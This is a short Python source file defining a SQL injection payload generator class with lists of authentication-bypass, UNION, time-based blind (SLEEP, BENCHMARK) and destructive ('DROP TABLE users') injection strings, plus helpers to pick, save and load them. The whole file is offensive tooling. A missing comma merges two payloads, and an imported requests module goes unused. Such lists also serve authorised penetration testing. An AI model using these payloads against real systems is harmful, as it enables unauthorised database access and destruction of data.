import random
import requests

class payload_gernrator:
    """
    Handles the generation of SQL injection payloads.
    """
    def __init__(self):
        self.payloads = []

    def generate_basic_payloads(self):
        self.payloads = [
            "' OR '1'='1", 
            "'; DROP TABLE users;--", 
            "' OR 1=1--", 
            "' AND 1=2--", 
            "' UNION SELECT NULL--"
            "' AND 1=2 UNION SELECT 1, 'test', 'test'--"
        ]
        return self.payloads

    def generate_blind_payloads(self):
        self.payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "' AND BENCHMARK(1000000,MD5(1))--",
            "' OR IF(1=1,SLEEP(5),0)--"
        ]
        return self.payloads

    def add_custom_payload(self, payload):
        self.payloads.append(payload)

    def get_payloads(self):
        return self.payloads
    
    def get_all_payloads(self):
        return self.payloads

    def get_random_payload(self):
        return random.choice(self.payloads)

    def add_payload(self, payload):
        self.payloads.append(payload)

    def remove_payload(self, payload):
        if payload in self.payloads:
            self.payloads.remove(payload)

    def clear_payloads(self):
        self.payloads.clear()

    def save_payloads(self, filename="payloads.txt"):
        with open(filename, "w") as f:
            f.write("\n".join(self.payloads))

    def load_payloads(self, filename="payloads.txt"):
        with open(filename, "r") as f:
            self.payloads = f.read().splitlines()